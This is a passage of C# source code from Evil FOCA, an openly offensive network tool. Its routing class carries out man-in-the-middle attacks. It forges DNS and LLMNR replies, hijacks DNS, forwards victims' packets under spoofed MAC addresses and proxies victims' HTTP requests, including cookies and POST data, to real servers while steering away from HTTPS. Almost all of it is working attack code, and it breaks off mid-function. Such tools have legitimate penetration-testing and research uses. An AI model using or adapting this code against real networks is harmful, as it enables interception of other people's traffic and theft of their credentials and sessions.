/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using evilfoca.Attacks;
using evilfoca.Data;
using evilfoca.HTTP;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap.LibPcap;
using SharpPcap.WinPcap;
using System.Diagnostics;
namespace evilfoca.Core
{
    public class Router
    {
        static object htppLock = new object();
        PhysicalAddress localPhysicalAddress;
        WinPcapDevice device;
        SynchronizedCollection<Data.Attack> attacks;
        private const int REDIRECTCOUNT = 3;
        DNSHijacking dnsHijacking;


        public Router(WinPcapDevice dev, SynchronizedCollection<Data.Attack> attacks, SynchronizedCollection<string> slaacReqs)
        {
            this.device = dev;
            this.localPhysicalAddress = device.MacAddress;
            this.attacks = attacks;
            //this.slaacReqs = slaacReqs;
            this.dnsHijacking = new DNSHijacking(dev, attacks);
        }


        /// <summary>
        /// Comprueba si el paquete ha sido enrutado verificando si llega de 8.8.8.8 con seqId = 1
        /// </summary>
        /// <returns></returns>
        private bool IsRoutedPacked(Packet p)
        {
            if ((p.PayloadPacket != null) && (p.PayloadPacket is IPv4Packet) &&
                (p.PayloadPacket.PayloadPacket != null) && (p.PayloadPacket.PayloadPacket is TcpPacket))
            {
                TcpPacket tcp = (TcpPacket)p.PayloadPacket.PayloadPacket;
                if (tcp.DestinationPort == 31337 && tcp.SourcePort == 53)
                {
                    if (tcp.AcknowledgmentNumber == 1)
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        private void DNSCheck(Packet p)
        {
            EthernetPacket ethernet = (EthernetPacket)p;
            if (p.PayloadPacket.PayloadPacket is UdpPacket)
            {
                UdpPacket udp = p.PayloadPacket.PayloadPacket as UdpPacket;
                attacks.Where(a => a.attackType == AttackType.SlaacMitm).ToList().ForEach(currentAttack =>
                    {
                        MitmAttack mitmAttack = currentAttack as MitmAttack;

                        if (p.PayloadPacket is IPv6Packet)
                        {
                            switch (udp.DestinationPort)
                            {
                                case 53:
                                    Heijden.DNS.Response response = new Heijden.DNS.Response(new IPEndPoint(IPAddress.Parse("1.2.3.4"), 53), udp.PayloadData);
                                    var aaaaDns = (from q in response.Questions
                                                   where q.QType == Heijden.DNS.QType.AAAA || q.QType == Heijden.DNS.QType.A
                                                   select q).ToList();

                                    //Para mostrar la pelotita de conexión a internet OK, respondemos al paquete Teredo de Microsoft en formato A.
                                    var aTeredoDns = (from q in response.Questions
                                                      where q.QType == Heijden.DNS.QType.A
                                                      && (q.QName.ToLower().Contains("teredo") || q.QName.ToLower().Contains("msftncsi"))
                                                      select q).ToList();

                                    if (aaaaDns != null && aaaaDns.Count > 0)
                                    {
                                        DNS.IPv6Query query = new DNS.IPv6Query(udp.PayloadData);
                                        string q = query.name;
                                        IPAddress[] ips = Dns.GetHostAddresses(q);

                                        DNS.IPv6Response resp = new DNS.IPv6Response(DNS.IPv6Query.Type.Ipv6, query.transID, query.nameDnsFormat, ips[0]);
                                        byte[] respByteAr = resp.GeneratePacket();

                                        EthernetPacket ethDns = new EthernetPacket(localPhysicalAddress, ethernet.SourceHwAddress, EthernetPacketType.IpV4);
                                        IPv6Packet ipv6Dns = new IPv6Packet(((IPv6Packet)p.PayloadPacket).DestinationAddress, ((IPv6Packet)p.PayloadPacket).SourceAddress);
                                        UdpPacket udpDns = new UdpPacket(udp.DestinationPort, udp.SourcePort);

                                        udpDns.PayloadData = respByteAr;
                                        ipv6Dns.PayloadPacket = udpDns;
                                        ethDns.PayloadPacket = ipv6Dns;

                                        udpDns.UpdateCalculatedValues();
                                        udpDns.UpdateUDPChecksum();
                                        ipv6Dns.UpdateCalculatedValues();
                                        Program.CurrentProject.data.SendPacket(ethDns);

                                    }
                                    else if (aTeredoDns != null && aTeredoDns.Count > 0)
                                    {
                                        DNS.IPv6Query query = new DNS.IPv6Query(udp.PayloadData);
                                        string q = query.name;
                                        IPAddress[] ips = Dns.GetHostAddresses(q);

                                        DNS.IPv6Response resp = new DNS.IPv6Response(DNS.IPv6Query.Type.Ipv4, query.transID, query.nameDnsFormat, ips[0]);
                                        byte[] respByteAr = resp.GeneratePacket();

                                        EthernetPacket ethDns = new EthernetPacket(localPhysicalAddress, ethernet.SourceHwAddress, EthernetPacketType.IpV4);
                                        IPv6Packet ipv6Dns = new IPv6Packet(((IPv6Packet)p.PayloadPacket).DestinationAddress, ((IPv6Packet)p.PayloadPacket).SourceAddress);
                                        UdpPacket udpDns = new UdpPacket(udp.DestinationPort, udp.SourcePort);

                                        udpDns.PayloadData = respByteAr;
                                        ipv6Dns.PayloadPacket = udpDns;
                                        ethDns.PayloadPacket = ipv6Dns;

                                        udpDns.UpdateCalculatedValues();
                                        udpDns.UpdateUDPChecksum();
                                        ipv6Dns.UpdateCalculatedValues();
                                        Program.CurrentProject.data.SendPacket(ethDns);
                                    }
                                    break;
                                case 5355:
                                    LLMNR.LLMNRPacket llmnr = new LLMNR.LLMNRPacket();
                                    llmnr.ParsePacket(udp.PayloadData);
                                    if (llmnr.Query.Type.HasValue && llmnr.Query.Type.Value == LLMNR.DNSType.AAAA)
                                    {
                                        IPAddress[] ips = (from ip in Dns.GetHostAddresses(llmnr.Query.Name)
                                                           where ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                                                           select ip).ToArray();
                                        byte[] ipv6Addr = new byte[] { 0x00,0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xff,0xff,
                                                                        (byte)ips[0].GetAddressBytes()[0],(byte)ips[0].GetAddressBytes()[1],
                                                                        (byte)ips[0].GetAddressBytes()[2] ,(byte)ips[0].GetAddressBytes()[3] };

                                        llmnr.AnswerList.Add(new LLMNR.DNSAnswer()
                                        {
                                            Class = evilfoca.LLMNR.DNSClass.IN,
                                            Name = llmnr.Query.Name,
                                            Type = evilfoca.LLMNR.DNSType.AAAA,
                                            RData = ipv6Addr,
                                            RDLength = (short)ipv6Addr.Length
                                        });


                                        EthernetPacket ethDns = new EthernetPacket(localPhysicalAddress, ethernet.SourceHwAddress, EthernetPacketType.IpV4);
                                        IPv6Packet ipv6Dns = new IPv6Packet(((IPv6Packet)p.PayloadPacket).DestinationAddress, ((IPv6Packet)p.PayloadPacket).SourceAddress);
                                        UdpPacket udpDns = new UdpPacket(udp.DestinationPort, udp.SourcePort);

                                        udpDns.PayloadData = llmnr.BuildPacket();

                                        ipv6Dns.PayloadPacket = udpDns;
                                        ethDns.PayloadPacket = ipv6Dns;

                                        udpDns.UpdateCalculatedValues();
                                        udpDns.UpdateUDPChecksum();
                                        ipv6Dns.UpdateCalculatedValues();
                                        Program.CurrentProject.data.SendPacket(ethDns);
                                    }
                                    break;
                                default:
                                    break;
                            }

                        }
                    });
            }
        }

        public void CheckToRoutePacket(Packet p)
        {
            EthernetPacket pEthernet = (EthernetPacket)p;

            if (pEthernet.PayloadPacket is ARPPacket)
                return; // ARPS NO SE ENRUTAN!!!

            DNSCheck(p);

            if ((p.PayloadPacket.PayloadPacket is UdpPacket) && (p.PayloadPacket.PayloadPacket as UdpPacket).SourcePort == 546)
                return;

            // Verifica si el paquete viene de 8.8.8.8 31337/53 con seqId=0
            // Si se cumple, es que la MAC que lo envia está haciendo de enrutador de paquetes hacia internet
            PhysicalAddress macOrigen = pEthernet.SourceHwAddress;
            Neighbor neighbor = Program.CurrentProject.data.GetNeighbor(macOrigen);
            if ((neighbor != null) && (neighbor.canRoutePackets == RouteStatus.Verifing))
            {
                if (IsRoutedPacked(p))
                {
                    neighbor.canRoutePackets = RouteStatus.CanRoute;
                    Program.CurrentProject.data.AddNeighbor(neighbor);
                }

            }

            // Si tiene que hijackear este paquete (DNS) mediante DNS Hijacking ...
            if (dnsHijacking.CheckIfHijack(pEthernet))
                p = dnsHijacking.Hijack(pEthernet); // Lo modifica para que al enrutarlo este se haga el dns hijacking

            RoutePacket(p);
        }

        private bool isIpv4Multicast(IPAddress ip)
        {
            int firstOctect = ip.GetAddressBytes()[0];
            if (firstOctect >= 224 || firstOctect <= 239)
                return true;
            return false;
        }

        private void RoutePacket(Packet p)
        {
            if (p == null)
                return;

            EthernetPacket pEthernet = (EthernetPacket)p;

            if ((pEthernet.PayloadPacket is IPv6Packet) == false && (pEthernet.PayloadPacket is IPv4Packet) == false)
                return;

            IpPacket pIp = (IpPacket)pEthernet.PayloadPacket;

            // Si es IPv6 y va hacia afuera de la red... 
            if (((pEthernet.PayloadPacket is IPv6Packet)))
            {
                if (pIp.DestinationAddress.IsIPv6LinkLocal == false &&
                    pIp.DestinationAddress.IsIPv6Multicast == false &&
                    pIp.DestinationAddress.IsIPv6Teredo == false &&
                     pIp.DestinationAddress.IsIPv6SiteLocal == false
                    )
                {
                    // Si ademas viene a mi MAC y no a mi IP ... sera para que lo enrute.
                    // Probablemente venga por un ataque SLAAC MITM
                    if (Program.CurrentProject.data.GetAttacks().Where(A => A.attackType == AttackType.SlaacMitm && A.attackStatus == AttackStatus.Attacking).Count() > 0)
                    {
                        bool needToRoute = !IsGoingToMyIPAddress(p);
                        if (needToRoute && IsGoingToMyMac(p))
                        {
                            Ipv6ToIpv4(pEthernet);

                            return;
                        }
                    }
                }
            }


            // Si es IPv4 o IPv6-LinkLocal
            if ((pEthernet.PayloadPacket is IPv4Packet) ||
                 ((pEthernet.PayloadPacket is IPv6Packet) && pIp.DestinationAddress.IsIPv6LinkLocal == true)
               )
            {
                // Si van dirigidos a mi MAC pero no a mi IP, a reenviar
                bool needToRoute = !IsGoingToMyIPAddress(p);


                if (needToRoute && IsGoingToMyMac(p))
                {
                    // Actualizamos el numero de paquetes que está enviando el target
                    Data.Target targetSender = null;
                    Data.Target targetReceiver = null;

                    foreach (Data.Attack attack in attacks)
                    {
                        if (attack is MitmAttack && attack.attackType != AttackType.SlaacMitm)
                        {
                            if (((MitmAttack)attack).t1.mac.Equals(pEthernet.SourceHwAddress))
                            {
                                targetSender = ((MitmAttack)attack).t1;
                                targetReceiver = ((MitmAttack)attack).t2;
                                break;
                            }
                            else if (((MitmAttack)attack).t2.mac.Equals(pEthernet.SourceHwAddress))
                            {
                                targetSender = ((MitmAttack)attack).t2;
                                targetReceiver = ((MitmAttack)attack).t1;
                                break;
                            }
                            else
                            {
                                targetSender = null;
                                targetReceiver = null;
                            }
                        }
                    }
                    if (targetReceiver == null || targetSender == null)
                        return;

                    // Modificamos el paquete para enrutarlo
                    // ...
                    // entra aqui cuando viene desde la red a un equipo local
                    if (targetReceiver.ip.Equals(pIp.DestinationAddress))
                    {
                        PhysicalAddress newDestinationMac = Program.CurrentProject.data.GetNeighborMAC(pIp.DestinationAddress);
                        pEthernet.DestinationHwAddress = newDestinationMac;
                        pEthernet.SourceHwAddress = localPhysicalAddress;

                        if (pEthernet.PayloadPacket.PayloadPacket is UdpPacket)
                            ((UdpPacket)pEthernet.PayloadPacket.PayloadPacket).UpdateUDPChecksum();

                        Program.CurrentProject.data.SendPacket(pEthernet);
                        targetReceiver.packetsSend++;
                    }

                    // Entra aqui cuando va desde el equipo local a la red
                    if (targetSender.ip.Equals(pIp.SourceAddress) && targetSender.mac.Equals(pEthernet.SourceHwAddress))
                    {
                        pEthernet.DestinationHwAddress = targetReceiver.mac;
                        pEthernet.SourceHwAddress = localPhysicalAddress;

                        if (pEthernet.PayloadPacket.PayloadPacket is UdpPacket)
                            ((UdpPacket)pEthernet.PayloadPacket.PayloadPacket).UpdateUDPChecksum();

                        Program.CurrentProject.data.SendPacket(pEthernet);
                        targetReceiver.packetsSend++;
                        //targetSender.packetsSend++;
                    }
                }
            }
        }

        private bool IsGoingToMyMac(Packet p)
        {
            EthernetPacket pEthernet = (EthernetPacket)p;
            return pEthernet.DestinationHwAddress.Equals(localPhysicalAddress);
        }

        private bool IsGoingToMyIPAddress(Packet p)
        {
            bool isGoing = false;

            IpPacket pIp = (IpPacket)p.PayloadPacket;

            foreach (PcapAddress remoteAddress in device.Addresses)
            {
                if (remoteAddress != null && remoteAddress.Addr.ipAddress != null && remoteAddress.Addr.ipAddress.Equals(pIp.DestinationAddress))
                {
                    isGoing = true; // Va dirigido a nuestra IP, así que no se enruta
                    break;
                }
            }
            return isGoing;
        }

        private bool IsMyIPAddressInPacket(Packet p)
        {
            bool isGoing = false;

            IpPacket pIp = (IpPacket)p.PayloadPacket;

            foreach (PcapAddress remoteAddress in device.Addresses)
            {
                if (remoteAddress.Addr.ipAddress != null && remoteAddress.Addr.ipAddress != null && (remoteAddress.Addr.ipAddress.Equals(pIp.DestinationAddress) || remoteAddress.Addr.ipAddress.Equals(pIp.SourceAddress)))
                {
                    isGoing = true; // Va dirigido a nuestra IP, así que no se enruta
                    break;
                }
            }
            return isGoing;
        }

        /// <summary>
        /// Indica si es necesario encapsular el contenido del paquete (ipv6) en Ipv4 para el ataque de mitm slaac
        /// http://www.elladodelmal.com/2012/04/man-in-middle-en-redes-ipv4-por-medio.html
        /// </summary>
        /// <param name="p"></param>
        /// <returns></returns>
        private bool EncapsulateIpv6IntoIpv4(Packet p)
        {
            EthernetPacket pEthernet = (EthernetPacket)p;

            if (pEthernet.PayloadPacket is IPv6Packet)
            {
                IPv6Packet ipv6 = (IPv6Packet)pEthernet.PayloadPacket;

                for (int iA = 0; iA < Program.CurrentProject.data.GetAttacks().Count; iA++)
                {
                    if (Program.CurrentProject.data.GetAttacks()[iA].attackStatus == AttackStatus.Attacking &&
                        Program.CurrentProject.data.GetAttacks()[iA].attackType == AttackType.SlaacMitm)
                    {
                        if (pEthernet.DestinationHwAddress.Equals(Program.CurrentProject.data.GetDevice().MacAddress))
                        {
                            if (Program.CurrentProject.data.GetAttacks()[iA] is evilfoca.Data.MitmAttack)
                            {
                                evilfoca.Data.MitmAttack mitm = (evilfoca.Data.MitmAttack)Program.CurrentProject.data.GetAttacks()[iA];
                                if ((ipv6.SourceAddress.Equals(mitm.t1.ip)) && (ipv6.DestinationAddress.Equals(mitm.t2.ip)) ||
                                   (ipv6.DestinationAddress.Equals(mitm.t1.ip)) && (ipv6.SourceAddress.Equals(mitm.t2.ip)))
                                {
                                    return true;
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        /// <summary>
        /// Indica si es necesario encapsular el contenido del paquete (ipv4) en Ipv6 para el ataque de mitm slaac
        /// http://www.elladodelmal.com/2012/04/man-in-middle-en-redes-ipv4-por-medio.html
        /// </summary>
        /// <param name="p"></param>
        /// <returns></returns>
        private bool EncapsulateIpv4IntoIpv6(Packet p)
        {
            EthernetPacket pEthernet = (EthernetPacket)p;

            if (pEthernet.PayloadPacket is IPv4Packet)
            {
                IPv4Packet ipv4 = (IPv4Packet)pEthernet.PayloadPacket;

                for (int iA = 0; iA < Program.CurrentProject.data.GetAttacks().Count; iA++)
                {
                    if (Program.CurrentProject.data.GetAttacks()[iA].attackStatus == AttackStatus.Attacking &&
                        Program.CurrentProject.data.GetAttacks()[iA].attackType == AttackType.SlaacMitm)
                    {
                        if (Program.CurrentProject.data.GetAttacks()[iA] is evilfoca.Data.MitmAttack)
                        {
                            evilfoca.Data.MitmAttack mitm = (evilfoca.Data.MitmAttack)Program.CurrentProject.data.GetAttacks()[iA];

                            Neighbor nT1 = Program.CurrentProject.data.GetNeighbor(mitm.t1.ip);
                            Neighbor nT2 = Program.CurrentProject.data.GetNeighbor(mitm.t2.ip);

                            IPAddress IPv4T1 = Program.CurrentProject.data.GetIPv4FromNeighbor(nT1);
                            IPAddress IPv4T2 = Program.CurrentProject.data.GetIPv4FromNeighbor(nT2);
                            IPAddress IPv6T1 = Program.CurrentProject.data.GetIPv6FromNeighbor(nT1);
                            IPAddress IPv6T2 = Program.CurrentProject.data.GetIPv6FromNeighbor(nT2);

                            if (pEthernet.DestinationHwAddress.Equals(Program.CurrentProject.data.GetDevice().MacAddress))
                            {
                                if ((ipv4.SourceAddress.Equals(mitm.t1.ip)) && (ipv4.DestinationAddress.Equals(mitm.t2.ip)) ||
                                   (ipv4.DestinationAddress.Equals(mitm.t1.ip)) && (ipv4.SourceAddress.Equals(mitm.t2.ip)))
                                {
                                    return true;
                                }
                            }

                        }
                    }
                }
            }

            return false;
        }


        private string Ipv6To4Addr(string ipv6addr)
        {
            try
            {

                string addr = ipv6addr.Substring(ipv6addr.Length - 9, 9);
                addr = string.Format("{0}.{1}.{2}.{3}", Convert.ToInt32(addr.Substring(0, 2), 16), Convert.ToInt32(addr.Substring(2, 2), 16), Convert.ToInt32(addr.Substring(5, 2), 16), Convert.ToInt32(addr.Substring(7, 2), 16));
                return IPAddress.Parse(addr).ToString();
            }
            catch
            {
                return string.Empty;
            }

        }

        private void Ipv6ToIpv4(EthernetPacket orgPacket)
        {
            try
            {
                IPv6Packet ipv6 = (IPv6Packet)orgPacket.PayloadPacket;

                if (ipv6.PayloadPacket is PacketDotNet.ICMPv6Packet)
                {
                    ICMPv6Packet icmp = ipv6.PayloadPacket as ICMPv6Packet;
                    icmp.Type = ICMPv6Types.EchoReply;

                    icmp.UpdateCalculatedValues();
                    icmp.Checksum = (ushort)ChecksumUtils.OnesComplementSum(icmp.Bytes);

                    IPv6Packet ipv6Ack = new IPv6Packet(ipv6.DestinationAddress, ipv6.SourceAddress);
                    ipv6Ack.PayloadPacket = icmp;
                    EthernetPacket eth = new EthernetPacket(orgPacket.DestinationHwAddress, orgPacket.SourceHwAddress, EthernetPacketType.IpV6);
                    eth.PayloadPacket = ipv6Ack;

                    Program.CurrentProject.data.SendPacket(eth);
                }
                else if (ipv6.PayloadPacket is PacketDotNet.TcpPacket)
                {
                    TcpPacket tcp = ipv6.PayloadPacket as TcpPacket;

                    ushort destPort = tcp.SourcePort;
                    ushort sourcePort = tcp.DestinationPort;
                    IPAddress destAddress = ipv6.SourceAddress;
                    IPAddress sourceAddress = ipv6.DestinationAddress;
                    PhysicalAddress sourceMac = device.MacAddress;
                    PhysicalAddress destMac = orgPacket.SourceHwAddress;

                    tcp.SourcePort = sourcePort;
                    tcp.DestinationPort = destPort;

                    if (tcp.Syn && !tcp.Ack && !tcp.Rst && tcp.PayloadData.Length == 0)
                    {
                        if (sourcePort == 80)
                        {
                            tcp.Ack = true;
                            tcp.AcknowledgmentNumber = tcp.SequenceNumber + 1;
                            tcp.SequenceNumber = tcp.SequenceNumber + 38;
                            tcp.WindowSize = 14600;

                            IPv6Packet ipv6Ack = new IPv6Packet(sourceAddress, destAddress);
                            ipv6Ack.PayloadPacket = tcp;

                            EthernetPacket eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV6);
                            eth.PayloadPacket = ipv6Ack;

                            (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                            Program.CurrentProject.data.SendPacket(eth);
                        }
                        else if (sourcePort == 443)
                        {
                            tcp.Syn = false;
                            tcp.Ack = true;
                            tcp.Rst = true;
                            tcp.Psh = false;
                            uint ackOrg = tcp.AcknowledgmentNumber;
                            tcp.AcknowledgmentNumber = tcp.SequenceNumber + 1;
                            tcp.SequenceNumber = 0;
                            tcp.WindowSize = 0;
                            tcp.PayloadData = new byte[0];

                            IPv6Packet ipv6Ack = new IPv6Packet(sourceAddress, destAddress);
                            ipv6Ack.PayloadPacket = tcp;
                            EthernetPacket eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV6);
                            eth.PayloadPacket = ipv6Ack;
                            (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                            Program.CurrentProject.data.SendPacket(eth);
                        }
                    }
                    else if (!tcp.Syn && tcp.Ack && tcp.PayloadData != null && !tcp.Rst && tcp.PayloadData.Length > 0 && sourcePort == 80)
                    {
                        string element = string.Format("{0}/{1}", tcp.SequenceNumber, tcp.AcknowledgmentNumber);
                        if (!Data.Data.SlaacReqList.Contains(element))
                        {
                            Data.Data.SlaacReqList.Add(element);
                            HttpPacket httpReq = new HttpPacket(tcp.PayloadData);
                            if (httpReq.IsCompleted)
                            {
                                SendHttpResponse(httpReq, orgPacket, tcp.SourcePort, tcp.DestinationPort, tcp.AcknowledgmentNumber, tcp.SequenceNumber + (uint)tcp.PayloadData.Length);
                            }
                            else
                            {
                                lock (htppLock)
                                {
                                    //incomplete packet

                                    TcpReconstructorPacket previousPacket = (from p in Program.CurrentProject.data.ReconstructedPackets
                                                                             where p.ExpectedSequenceNumber == tcp.SequenceNumber
                                                                             select p).FirstOrDefault();


                                    TcpReconstructorPacket nextPacket = (from p in Program.CurrentProject.data.ReconstructedPackets
                                                                         where p.FirstSequenceNumber == tcp.SequenceNumber + tcp.PayloadData.Length
                                                                         select p).FirstOrDefault();

                                    if (nextPacket != null || previousPacket != null)
                                    {
                                        bool packetSend = false;
                                        if (nextPacket != null)
                                        {
                                            nextPacket.InsertPreviousTcpPacket(tcp);
                                            httpReq = new HttpPacket(nextPacket.Data);
                                            if (httpReq.IsCompleted)
                                            {
                                                packetSend = true;
                                                Program.CurrentProject.data.ReconstructedPackets.Remove(nextPacket);
                                                SendHttpResponse(httpReq, orgPacket, tcp.SourcePort, tcp.DestinationPort, tcp.AcknowledgmentNumber, nextPacket.ExpectedSequenceNumber);
                                            }
                                        }
                                        if (previousPacket != null && !packetSend)
                                        {
                                            if (nextPacket != null)
                                            {
                                                previousPacket.AppendTcpPacket(nextPacket);
                                                Program.CurrentProject.data.ReconstructedPackets.Remove(nextPacket);
                                            }
                                            else
                                                previousPacket.AppendTcpPacket(tcp);

                                            httpReq = new HttpPacket(previousPacket.Data);
                                            if (httpReq.IsCompleted)
                                            {
                                                Program.CurrentProject.data.ReconstructedPackets.Remove(previousPacket);
                                                SendHttpResponse(httpReq, orgPacket, tcp.SourcePort, tcp.DestinationPort, tcp.AcknowledgmentNumber, previousPacket.ExpectedSequenceNumber);
                                            }
                                        }

                                    }
                                    else
                                    {
                                        Program.CurrentProject.data.ReconstructedPackets.Add(new TcpReconstructorPacket(tcp));
                                    }


                                    var toDelete = Program.CurrentProject.data.ReconstructedPackets.Where(p => DateTime.Now.Subtract(p.CreationTime).TotalMinutes > 2);
                                    foreach (var item in toDelete)
                                    {
                                        Program.CurrentProject.data.ReconstructedPackets.Remove(item);
                                    }
                                }
                            }
                        }
                    }
                    else if (tcp.Fin && tcp.Ack && !tcp.Rst && tcp.PayloadData.Length == 0)
                    {
                        tcp.Ack = true;
                        tcp.Fin = false;
                        uint ackOrg = tcp.AcknowledgmentNumber;
                        tcp.AcknowledgmentNumber = tcp.SequenceNumber + 1;
                        tcp.SequenceNumber = ackOrg;
                        tcp.WindowSize = 1400;

                        IPv6Packet ipv6Ack = new IPv6Packet(sourceAddress, destAddress);
                        ipv6Ack.PayloadPacket = tcp;
                        EthernetPacket eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV6);
                        eth.PayloadPacket = ipv6Ack;
                        (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                        Program.CurrentProject.data.SendPacket(eth);
                    }
                }
            }
            catch
            {
            }
        }

        private void SendHttpResponse(HttpPacket httpReq, EthernetPacket orgEthPacket, ushort sourcePort, ushort destinationPort, uint ackNumber, uint expectedSeqNumber)
        {
            IPv6Packet ipv6 = (IPv6Packet)orgEthPacket.PayloadPacket;
            TcpPacket tcp = new TcpPacket(sourcePort, destinationPort);

            IPAddress destAddress = ipv6.SourceAddress;
            IPAddress sourceAddress = ipv6.DestinationAddress;
            PhysicalAddress sourceMac = device.MacAddress;
            PhysicalAddress destMac = orgEthPacket.SourceHwAddress;
            string urlRequest = string.IsNullOrEmpty(httpReq.Host) ? string.Format("http://{0}{1}", Ipv6To4Addr(ipv6.DestinationAddress.ToString()), httpReq.ResourceRequest) : httpReq.FullUrlRequest;
            bool validRequest = false;

            HttpWebRequest req = null;
            HttpWebResponse response = null;
            IPv6Packet ipv6Ack = null;
            EthernetPacket eth = null;
            CookieContainer lastCookies = httpReq.Cookies;
            string userAgent = httpReq.UserAgent;
            int repeatRedirect = 0;

            //Fix no Google's javascript redirect
            if (httpReq.Host.Contains("google") && httpReq.FullUrlRequest.Contains("/xjs/_/js/"))
                validRequest = true;

            while (!validRequest)
            {
                req = HttpWebRequest.Create(urlRequest) as HttpWebRequest;

                req.Host = req.Address.Host;
                req.UserAgent = userAgent;
                req.Method = httpReq.Method;
                //req.Accept = httpReq.Accept;
                req.Headers[HttpRequestHeader.AcceptLanguage] = httpReq.AcceptLanguage;
                req.Referer = httpReq.Referer;
                req.AllowAutoRedirect = false;

                if (lastCookies == null)
                    lastCookies = new CookieContainer();
                req.CookieContainer = lastCookies;

                if (httpReq.Method.ToLower() == "post" && httpReq.Data != null)
                {
                    req.ContentType = httpReq.ContentType;
                    req.ContentLength = httpReq.Data.Length;

                    using (Stream dataStream = req.GetRequestStream())
                    {
                        using (BinaryWriter writer = new BinaryWriter(dataStream))
                        {
                            writer.Write(httpReq.Data);
                        }
                    }
                }

                try
                {
                    response = req.GetResponse() as HttpWebResponse;
                    if ((response.StatusCode == HttpStatusCode.Found || response.StatusCode == HttpStatusCode.Moved) && response.Headers[HttpResponseHeader.Location].StartsWith("https"))
                        throw new WebException("302", null, WebExceptionStatus.UnknownError, response);
                    else
                        validRequest = true;
                }
                catch (WebException ex404)
                {
                    if (ex404.Message.Contains("404") && ex404.Response != null)
                    {
                        if ((ex404.Response as HttpWebResponse) != null)
                            response = (ex404.Response as HttpWebResponse);
                        validRequest = true;
                    }
                    else if (ex404.Message.Contains("403") && ex404.Response.ResponseUri.AbsoluteUri.StartsWith("http:"))
                    {
                        validRequest = false;
                        urlRequest = string.Format("https{0}", ex404.Response.ResponseUri.AbsoluteUri.Substring(4));
                        if (!string.IsNullOrEmpty(ex404.Response.Headers[HttpResponseHeader.SetCookie]))
                        {
                            CookieCollection col = HttpPacket.ParseSetCookies(ex404.Response.Headers[HttpResponseHeader.SetCookie]);
                            if (col.Count > 0)
                            {
                                if (!string.IsNullOrEmpty(col[0].Domain))
                                {
                                    string domain = col[0].Domain;
                                    if (domain.StartsWith("."))
                                        domain = domain.Remove(0, 1);
                                    lastCookies.Add(new Uri(string.Format("http://{0}", domain)), col);
                                }
                                else
                                    lastCookies.Add(ex404.Response.ResponseUri, col);
                            }
                        }
                    }
                    else if (ex404.Message.Contains("302"))
                    {
                        if (repeatRedirect < REDIRECTCOUNT)
                        {
                            validRequest = false;
                            urlRequest = ex404.Response.Headers[HttpResponseHeader.Location];
                            if (!string.IsNullOrEmpty(ex404.Response.Headers[HttpResponseHeader.SetCookie]))
                            {
                                CookieCollection col = HttpPacket.ParseSetCookies(ex404.Response.Headers[HttpResponseHeader.SetCookie]);
                                if (col.Count > 0)
                                {
                                    if (!string.IsNullOrEmpty(col[0].Domain))
                                    {
                                        string domain = col[0].Domain;
                                        if (domain.StartsWith("."))
                                            domain = domain.Remove(0, 1);
                                        if (urlRequest.StartsWith("https"))
                                            lastCookies.Add(new Uri(string.Format("https://{0}", domain)), col);
                                        else
                                            lastCookies.Add(new Uri(string.Format("http://{0}", domain)), col);
                                    }
                                    else
                                        lastCookies.Add(ex404.Response.ResponseUri, col);
                                }
                            }
                            repeatRedirect++;
                        }
                        else
                        {
                            validRequest = true;
                            response = null;
                        }
                    }
                    else
                    {
                        validRequest = true;
                    }
                }
                catch (Exception)
                {
                }
            }
            int previousLength = 0;

            uint ackValue = expectedSeqNumber;
            uint sequence = ackNumber;
            if (response != null)
            {
                try
                {
                    foreach (var item in response.GetBytes(1300))
                    {
                        tcp.Psh = false;
                        tcp.Fin = false;
                        tcp.Ack = true;
                        tcp.AcknowledgmentNumber = ackValue;
                        tcp.SequenceNumber = sequence + (uint)previousLength;
                        sequence = tcp.SequenceNumber;
                        previousLength = item.Length;

                        tcp.WindowSize = 1600;
                        tcp.PayloadData = item;

                        ipv6Ack = new IPv6Packet(sourceAddress, destAddress);
                        ipv6Ack.PayloadPacket = tcp;
                        eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV6);
                        eth.PayloadPacket = ipv6Ack;
                        (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                        Program.CurrentProject.data.SendPacket(eth);
                    }
                }
                catch (Exception e)
                {
                    e.ToString();
                }


                tcp.Psh = true;
                tcp.Fin = true;
                tcp.Ack = true;
                tcp.AcknowledgmentNumber = ackValue;
                tcp.SequenceNumber = sequence + (uint)previousLength;

                tcp.WindowSize = 1600;
                tcp.PayloadData = new byte[0];

                ipv6Ack = new IPv6Packet(sourceAddress, destAddress);
                ipv6Ack.PayloadPacket = tcp;
                eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV6);
                eth.PayloadPacket = ipv6Ack;
                (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                Program.CurrentProject.data.SendPacket(eth);
            }
            else
            {
                tcp.Psh = true;
                tcp.Fin = true;
                tcp.Ack = true;
                tcp.AcknowledgmentNumber = ackValue;
                tcp.SequenceNumber = sequence + (uint)previousLength;
                tcp.WindowSize = 1600;
                tcp.PayloadData = HttpPacket.Get404Packet();

                ipv6Ack = new IPv6Packet(sourceAddress, destAddress);
                ipv6Ack.PayloadPacket = tcp;
                eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV6);
                eth.PayloadPacket = ipv6Ack;
                (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
